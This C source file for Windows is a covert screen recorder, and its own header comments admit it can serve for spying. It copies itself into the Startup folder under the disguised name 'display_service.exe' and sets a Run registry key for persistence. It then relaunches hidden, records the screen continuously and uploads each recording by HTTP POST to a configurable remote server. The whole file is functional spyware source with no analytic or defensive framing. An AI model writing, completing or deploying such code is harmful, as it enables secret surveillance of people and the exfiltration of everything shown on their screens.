// claude code
//stores the program itself and the recording of the PC into startup folder (quite hidden from user's eyes) can be used for spying with little to no modification in code
// a little issue when startup need to wrok on it regardless program is upto mark and can be malicious in hands of evil
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")

// ─── CONFIG ───────────────────────────────────────────────────────────────────
#define RECORD_SECONDS   60
#define FPS              10
#define EXE_NAME         "display_service.exe"
#define CFG_NAME         "recorder.cfg"
#define RECORDINGS_DIR   "Recordings"
// ──────────────────────────────────────────────────────────────────────────────

typedef struct {
    char upload_url[512];
    char auth_token[256];
} Config;

// ─────────────────────────────────────────────────────────────────────────────
// PATH HELPERS
// ─────────────────────────────────────────────────────────────────────────────

void get_exe_path(char *buf, size_t size) {
    GetModuleFileName(NULL, buf, (DWORD)size);
}

void get_exe_dir(char *buf, size_t size) {
    get_exe_path(buf, size);
    char *slash = strrchr(buf, '\\');
    if (slash) *slash = '\0';
}

void get_startup_folder(char *buf, size_t size) {
    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, buf);
}

void get_installed_exe(char *buf, size_t size) {
    char startup[MAX_PATH] = {0};
    get_startup_folder(startup, sizeof(startup));
    snprintf(buf, size, "%s\\%s", startup, EXE_NAME);
}

void get_recordings_dir(char *buf, size_t size) {
    char startup[MAX_PATH] = {0};
    get_startup_folder(startup, sizeof(startup));
    snprintf(buf, size, "%s\\%s", startup, RECORDINGS_DIR);
}

void get_installed_cfg(char *buf, size_t size) {
    char startup[MAX_PATH] = {0};
    get_startup_folder(startup, sizeof(startup));
    snprintf(buf, size, "%s\\%s", startup, CFG_NAME);
}

// ─────────────────────────────────────────────────────────────────────────────
// SELF-INSTALL
// ─────────────────────────────────────────────────────────────────────────────

int is_running_from_startup() {
    char exe_path[MAX_PATH] = {0};
    char installed[MAX_PATH] = {0};
    get_exe_path(exe_path, sizeof(exe_path));
    get_installed_exe(installed, sizeof(installed));
    return (_stricmp(exe_path, installed) == 0);
}

void self_install() {
    char startup[MAX_PATH] = {0};
    char exe_src[MAX_PATH] = {0};
    char exe_dst[MAX_PATH] = {0};
    char cfg_src[MAX_PATH] = {0};
    char cfg_dst[MAX_PATH] = {0};
    char rec_dir[MAX_PATH] = {0};
    char exe_dir[MAX_PATH] = {0};

    get_startup_folder(startup, sizeof(startup));
    get_exe_path(exe_src, sizeof(exe_src));
    get_installed_exe(exe_dst, sizeof(exe_dst));
    get_recordings_dir(rec_dir, sizeof(rec_dir));
    get_installed_cfg(cfg_dst, sizeof(cfg_dst));
    get_exe_dir(exe_dir, sizeof(exe_dir));
    snprintf(cfg_src, sizeof(cfg_src), "%s\\%s", exe_dir, CFG_NAME);

    CreateDirectory(rec_dir, NULL);
    CopyFile(exe_src, exe_dst, FALSE);

    if (GetFileAttributes(cfg_src) != INVALID_FILE_ATTRIBUTES) {
        CopyFile(cfg_src, cfg_dst, FALSE);
    } else {
        FILE *f = fopen(cfg_dst, "w");
        if (f) {
            fprintf(f, "# Screen Recorder Config\n");
            fprintf(f, "upload_url=\n");
            fprintf(f, "auth_token=\n");
            fclose(f);
        }
    }

    HKEY hkey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegSetValueEx(hkey, "DisplayService", 0, REG_SZ,
                      (BYTE*)exe_dst, (DWORD)(strlen(exe_dst) + 1));
        RegCloseKey(hkey);
    }

    ShellExecute(NULL, "open", exe_dst, NULL, startup, SW_HIDE);
    ExitProcess(0);
}

// ─────────────────────────────────────────────────────────────────────────────
// CONFIG
// ─────────────────────────────────────────────────────────────────────────────

void read_config(Config *cfg) {
    char cfg_path[MAX_PATH] = {0};
    get_installed_cfg(cfg_path, sizeof(cfg_path));
    FILE *f = fopen(cfg_path, "r");
    if (!f) return;
    char line[768];
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = 0;
        if (line[0] == '#' || line[0] == '\0') continue;
        if (strncmp(line, "upload_url=", 11) == 0)
            strncpy(cfg->upload_url, line + 11, sizeof(cfg->upload_url) - 1);
        else if (strncmp(line, "auth_token=", 11) == 0)
            strncpy(cfg->auth_token, line + 11, sizeof(cfg->auth_token) - 1);
    }
    fclose(f);
}

// ─────────────────────────────────────────────────────────────────────────────
// SCREEN CAPTURE
// ─────────────────────────────────────────────────────────────────────────────

BYTE* capture_frame(int *out_w, int *out_h) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    *out_w = w; *out_h = h;

    HDC screen_dc = GetDC(NULL);
    HDC mem_dc    = CreateCompatibleDC(screen_dc);
    HBITMAP hbmp  = CreateCompatibleBitmap(screen_dc, w, h);
    SelectObject(mem_dc, hbmp);
    BitBlt(mem_dc, 0, 0, w, h, screen_dc, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = w;
    bih.biHeight      = h;
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    int row_size = ((w * 3 + 3) & ~3);
    BYTE *pixels = (BYTE*)malloc(row_size * h);
    GetDIBits(mem_dc, hbmp, 0, h, pixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);

    DeleteObject(hbmp);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    return pixels;
}

// ─────────────────────────────────────────────────────────────────────────────
// AVI WRITER — uncompressed BGR24, opens in VLC / Windows Media Player / any player
// ─────────────────────────────────────────────────────────────────────────────

static void write_u32(FILE *f, uint32_t v) { fwrite(&v, 4, 1, f); }
static void write_u16(FILE *f, uint16_t v) { fwrite(&v, 2, 1, f); }
static void write_tag(FILE *f, const char *t) { fwrite(t, 4, 1, f); }

typedef struct {
    uint32_t flags;
    uint32_t offset;
    uint32_t size;
} IdxEntry;

void record_avi(const char *filepath) {
    int fps_val      = FPS;
    int total_frames = RECORD_SECONDS * fps_val;
    int delay_ms     = 1000 / fps_val;

    // Capture first frame to know dimensions
    int w = 0, h = 0;
    BYTE *first_frame = capture_frame(&w, &h);
    int row_size   = ((w * 3 + 3) & ~3);
    int frame_size = row_size * h;

    FILE *f = fopen(filepath, "wb");
    if (!f) { free(first_frame); return; }

    // Index: one entry per frame
    IdxEntry *idx = (IdxEntry*)malloc(total_frames * sizeof(IdxEntry));
    int nframes = 0;

    // ── RIFF AVI header ───────────────────────────────────────────────────────
    write_tag(f, "RIFF");
    long riff_size_off = ftell(f); write_u32(f, 0);
    write_tag(f, "AVI ");

    // LIST hdrl
    write_tag(f, "LIST");
    long hdrl_size_off = ftell(f); write_u32(f, 0);
    write_tag(f, "hdrl");

    // avih (Main AVI Header)
    write_tag(f, "avih"); write_u32(f, 56);
    write_u32(f, (uint32_t)(1000000 / fps_val)); // us per frame
    write_u32(f, (uint32_t)(frame_size * fps_val)); // max bytes/sec
    write_u32(f, 0);        // padding
    write_u32(f, 0x10);     // AVIF_HASINDEX
    long avih_frames_off = ftell(f);
    write_u32(f, (uint32_t)total_frames);
    write_u32(f, 0);        // initial frames
    write_u32(f, 1);        // streams
    write_u32(f, (uint32_t)frame_size); // buffer size
    write_u32(f, (uint32_t)w);
    write_u32(f, (uint32_t)h);
    write_u32(f,0); write_u32(f,0); write_u32(f,0); write_u32(f,0);

    // LIST strl
    write_tag(f, "LIST");
    long strl_size_off = ftell(f); write_u32(f, 0);
    write_tag(f, "strl");

    // strh (Stream Header)
    write_tag(f, "strh"); write_u32(f, 56);
    write_tag(f, "vids");
    write_tag(f, "\0\0\0\0"); // uncompressed
    write_u32(f, 0);  // flags
    write_u16(f, 0);  // priority
    write_u16(f, 0);  // language
    write_u32(f, 0);  // initial frames
    write_u32(f, 1);  // scale
    write_u32(f, (uint32_t)fps_val); // rate
    write_u32(f, 0);  // start
    write_u32(f, (uint32_t)total_frames);
    write_u32(f, (uint32_t)frame_size);
    write_u32(f, (uint32_t)-1); // quality
    write_u32(f, 0);  // sample size
    write_u16(f, 0); write_u16(f, 0);
    write_u16(f, (uint16_t)w); write_u16(f, (uint16_t)h);

    // strf (BITMAPINFOHEADER)
    write_tag(f, "strf"); write_u32(f, 40);
    write_u32(f, 40);
    write_u32(f, (uint32_t)w);
    write_u32(f, (uint32_t)h);
    write_u16(f, 1);   // planes
    write_u16(f, 24);  // bit count
    write_u32(f, 0);   // BI_RGB
    write_u32(f, (uint32_t)frame_size);
    write_u32(f, 0); write_u32(f, 0);
    write_u32(f, 0); write_u32(f, 0);

    // Patch strl size
    long pos = ftell(f);
    fseek(f, strl_size_off, SEEK_SET);
    write_u32(f, (uint32_t)(pos - strl_size_off - 4));
    fseek(f, pos, SEEK_SET);

    // Patch hdrl size
    pos = ftell(f);
    fseek(f, hdrl_size_off, SEEK_SET);
    write_u32(f, (uint32_t)(pos - hdrl_size_off - 4));
    fseek(f, pos, SEEK_SET);

    // LIST movi
    write_tag(f, "LIST");
    long movi_size_off = ftell(f); write_u32(f, 0);
    write_tag(f, "movi");
    long movi_start = ftell(f);

    // ── Write frames ──────────────────────────────────────────────────────────
    // Helper lambda-style macro to write one frame and record its index entry
    #define WRITE_FRAME(pixels_ptr) do { \
        long chunk_off = ftell(f); \
        write_tag(f, "00dc"); \
        write_u32(f, (uint32_t)frame_size); \
        fwrite((pixels_ptr), frame_size, 1, f); \
        if (frame_size & 1) fputc(0, f); \
        idx[nframes].flags  = 0x10; \
        idx[nframes].offset = (uint32_t)(chunk_off - movi_start); \
        idx[nframes].size   = (uint32_t)frame_size; \
        nframes++; \
    } while(0)

    WRITE_FRAME(first_frame);
    free(first_frame);

    for (int i = 1; i < total_frames; i++) {
        Sleep(delay_ms);
        int fw, fh;
        BYTE *pix = capture_frame(&fw, &fh);
        WRITE_FRAME(pix);
        free(pix);
    }

    // Patch movi size
    pos = ftell(f);
    fseek(f, movi_size_off, SEEK_SET);
    write_u32(f, (uint32_t)(pos - movi_size_off - 4));
    fseek(f, pos, SEEK_SET);

    // ── idx1 index ────────────────────────────────────────────────────────────
    write_tag(f, "idx1");
    write_u32(f, (uint32_t)(nframes * 16));
    for (int i = 0; i < nframes; i++) {
        write_tag(f, "00dc");
        write_u32(f, idx[i].flags);
        write_u32(f, idx[i].offset + 4); // +4: offset from "movi" tag itself
        write_u32(f, idx[i].size);
    }
    free(idx);

    // Patch avih frame count
    fseek(f, avih_frames_off, SEEK_SET);
    write_u32(f, (uint32_t)nframes);

    // Patch RIFF size
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, riff_size_off, SEEK_SET);
    write_u32(f, (uint32_t)(file_size - 8));

    fclose(f);
}

// ─────────────────────────────────────────────────────────────────────────────
// HTTP UPLOAD
// ─────────────────────────────────────────────────────────────────────────────

int upload_file(const char *filepath, const Config *cfg) {
    if (cfg->upload_url[0] == '\0') return 1;

    URL_COMPONENTS uc = {0};
    uc.dwStructSize     = sizeof(uc);
    char host[256] = {0}, path[512] = {0};
    uc.lpszHostName     = host;
    uc.dwHostNameLength = sizeof(host);
    uc.lpszUrlPath      = path;
    uc.dwUrlPathLength  = sizeof(path);

    if (!InternetCrackUrl(cfg->upload_url, 0, 0, &uc)) return 0;

    HINTERNET hNet = InternetOpen("ScreenRecorder/1.0",
                                   INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hNet) return 0;

    HINTERNET hConn = InternetConnect(hNet, host, uc.nPort,
                                       NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hNet); return 0; }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (uc.nScheme == INTERNET_SCHEME_HTTPS) flags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequest(hConn, "POST", path,
                                      NULL, NULL, NULL, flags, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hNet);
        return 0;
    }

    char boundary[] = "----SRecBoundary7349";
    char head[512], tail[128];
    const char *fname = strrchr(filepath, '\\');
    fname = fname ? fname + 1 : filepath;

    snprintf(head, sizeof(head),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, fname);
    snprintf(tail, sizeof(tail), "\r\n--%s--\r\n", boundary);

    FILE *f = fopen(filepath, "rb");
    if (!f) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        InternetCloseHandle(hNet);
        return 0;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);
    BYTE *fbuf = (BYTE*)malloc(fsize);
    fread(fbuf, 1, fsize, f);
    fclose(f);

    DWORD total_size = (DWORD)(strlen(head) + fsize + strlen(tail));

    char content_type[128], extra_headers[512] = {0};
    snprintf(content_type, sizeof(content_type),
             "Content-Type: multipart/form-data; boundary=%s\r\n", boundary);
    if (cfg->auth_token[0])
        snprintf(extra_headers, sizeof(extra_headers),
                 "Authorization: Bearer %s\r\n", cfg->auth_token);

    char all_headers[640];
    snprintf(all_headers, sizeof(all_headers), "%s%s", content_type, extra_headers);

    BYTE *body = (BYTE*)malloc(total_size);
    DWORD off = 0;
    memcpy(body + off, head, strlen(head)); off += (DWORD)strlen(head);
    memcpy(body + off, fbuf, fsize);        off += fsize;
    memcpy(body + off, tail, strlen(tail));
    free(fbuf);

    BOOL ok = HttpSendRequest(hReq, all_headers, (DWORD)strlen(all_headers),
                               body, total_size);
    free(body);

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hNet);
    return ok ? 1 : 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// FILENAME — .avi
// ─────────────────────────────────────────────────────────────────────────────

void make_filename(char *buf, size_t size) {
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    snprintf(buf, size, "rec_%04d%02d%02d_%02d%02d%02d.avi",
             tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
             tm->tm_hour, tm->tm_min, tm->tm_sec);
}

// ─────────────────────────────────────────────────────────────────────────────
// ENTRY POINT
// ─────────────────────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {

    if (!is_running_from_startup()) {
        self_install();
        return 0;
    }

    Sleep(5000);

    Config cfg = {0};
    read_config(&cfg);

    char rec_dir[MAX_PATH] = {0};
    get_recordings_dir(rec_dir, sizeof(rec_dir));
    CreateDirectory(rec_dir, NULL);

    while (1) {
        char filename[64];
        make_filename(filename, sizeof(filename));

        char rec_path[MAX_PATH] = {0};
        snprintf(rec_path, sizeof(rec_path), "%s\\%s", rec_dir, filename);

        record_avi(rec_path);

        if (cfg.upload_url[0] != '\0') {
            upload_file(rec_path, &cfg);
        }
    }

    return 0;
}
